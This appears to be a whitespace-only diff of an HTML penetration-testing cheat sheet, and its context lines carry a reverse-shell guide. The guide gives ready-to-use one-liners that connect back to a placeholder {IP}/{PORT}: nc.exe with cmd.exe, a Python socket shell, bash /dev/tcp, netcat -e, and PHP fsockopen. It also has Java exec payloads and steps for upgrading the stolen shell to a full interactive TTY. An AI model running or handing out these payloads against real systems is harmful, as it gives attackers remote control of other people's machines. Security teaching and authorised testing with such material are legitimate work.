@@ -336,7 +336,6 @@ a listener with <code>netcat</code>:</p>
 # after the connection is established
 python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 </code></pre>
-
 <blockquote>
 <p>On macOS use the <code>netcat</code> from <a href="https://formulae.brew.sh/formula/netcat" target="_blank">homebrew</a>
 instead of the one provided by the OS</p>
@@ -347,18 +346,15 @@ instead of the one provided by the OS</p>
 Type on your terminal:</p>
 <pre><code class="language-bash">stty raw -echo
 </code></pre>
-
 <p>The console should be black, next foreground the shell with:</p>
 <pre><code class="language-bash">fg
 reset
 </code></pre>
-
 <p>On target host:</p>
 <pre><code class="language-bash">export SHELL=bash
 export TERM=xterm-256color
 stty rows 24 columns 80
 </code></pre>
-
 <p>Now you should have a complete shell with shortcuts available.</p>
 <h2 id="on-the-remote-server">On the remote server</h2>
 <h3 id="windows">Windows</h3>
@@ -366,17 +362,14 @@ stty rows 24 columns 80
 then use the command (same as <a href="#netcat">NetCat</a>):</p>
 <pre><code class="language-bash">cmd.exe /C &quot;nc.exe {IP} {PORT} -e cmd.exe&quot;
 </code></pre>
-
 <h3 id="powershell">PowerShell</h3>
 <p>This is explain in the <a href="../windows/#download-and-execute-script">Windows / Download and execute script section</a>.</p>
 <h3 id="python">Python</h3>
 <pre><code class="language-bash">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{IP}&quot;,{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
-
 <h3 id="bash">Bash</h3>
 <pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1
 </code></pre>
-
 <blockquote>
 <p>To use the bash's built-in <code>/dev/tcp</code> device file the use must use <code>/bin/bash</code>
 as shell. Often it uses <code>sh</code> or <code>dash</code>, then you can use <code>bash -c "&lt;cmd&gt;"</code> to
@@ -385,19 +378,16 @@ force the <code>bash</code></p>
 <h3 id="netcat">Netcat</h3>
 <pre><code class="language-bash">nc -e /bin/sh {IP} {PORT}
 </code></pre>
-
 <h3 id="java">Java</h3>
 <pre><code class="language-java">r = Runtime.getRuntime();p = r.exec([&quot;your payload&quot;] as String[]);p.waitFor()
 String[] cmd={&quot;cmd&quot;,&quot;/C&quot;,&quot;&lt;cmd&gt;&quot;};Runtime.getRuntime().exec(cmd);
 </code></pre>
-
 <blockquote>
 <p>This payload can also work with <code>BeanShell</code> scripts.</p>
 </blockquote>
 <h3 id="php">PHP</h3>
 <pre><code class="language-bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>
-
 <h2 id="forward-shell">Forward shell</h2>
 <p>If the remote server cannot contact your local machine, it's still possible to
 use a shell that accept commands from named pipes using <code>mkfifo</code> and send the
